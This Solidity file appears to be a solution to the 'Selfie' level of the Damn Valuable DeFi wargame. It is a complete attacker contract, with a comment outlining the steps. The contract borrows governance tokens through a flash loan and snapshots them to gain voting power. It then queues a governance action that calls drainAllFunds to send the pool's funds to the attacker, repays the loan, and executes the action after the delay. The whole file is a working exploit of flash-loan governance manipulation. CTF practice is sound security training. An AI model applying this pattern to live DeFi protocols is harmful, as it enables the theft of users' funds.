pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

/*
1) flashloan out all of the tokens
2) propose governanceAction using queueAction
    receiver is the pool
    data is a call to drainAllFunds
    weiAmount is 0?
3) return the flashloaned tokens
5) wait for two days to pass
6) executeAction
7) ????
8) profit???
*/

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IDVT {
    function transfer(address receiver, uint256 amount) external;
}

contract SelfieAttacker {

    address payable private _attacker;
    address payable private _pool;
    address payable private _governance;
    uint256 private actionId;

    constructor(address payable attacker, address payable pool, address payable governance) {
        _attacker = attacker;
        _pool = pool;
        _governance = governance;
    }

    function attack(uint256 amount) external {
        ISelfiePool(_pool).flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external payable {
        DamnValuableTokenSnapshot governanceToken = DamnValuableTokenSnapshot(token);
        governanceToken.snapshot();

        bytes memory payload = abi.encodeWithSignature("drainAllFunds(address)", _attacker);

        actionId = ISimpleGovernance(_governance).queueAction(_pool, payload, 0);

        IDVT(token).transfer(_pool, amount);
    }

    function attack2() external{
        ISimpleGovernance(_governance).executeAction(actionId);
    }




}
